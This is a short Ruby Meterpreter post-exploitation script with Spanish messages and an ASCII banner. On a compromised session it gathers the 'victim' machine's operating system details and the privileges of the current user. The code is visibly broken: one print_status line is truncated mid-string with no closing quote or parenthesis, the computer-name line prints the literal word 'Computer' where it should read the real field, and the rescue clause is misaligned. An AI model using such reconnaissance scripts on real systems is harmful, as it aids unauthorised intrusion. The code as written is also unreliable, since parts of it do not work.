puts"┏━┓┏┳┓┏━┓╻ ╻┏┓╻"
puts"┗━┓┃┃┃┣━┛┃┏┛┃┗┫"
puts"┗━┛╹ ╹╹  ┗┛ ╹ ╹"

def obtener(session)
    begin
        sysnfo = session.sys.config.sysinfo
        privilegios = session.sys.config.getuid
        print_status("Obteniendo informacion del sistema ...")
        print_status("El sistema operativo de la victima es: #{sysnfo['OS']}")
        print_status("El nombre de la computadora es: #{'Computer'}")
        print_status("Este script se esta ejecutando con privilegios del usuar>
  rescue ::Exception => e
        print_error("El siguiente error fue encontrado: #{e}")
    end
end

obtener(client)
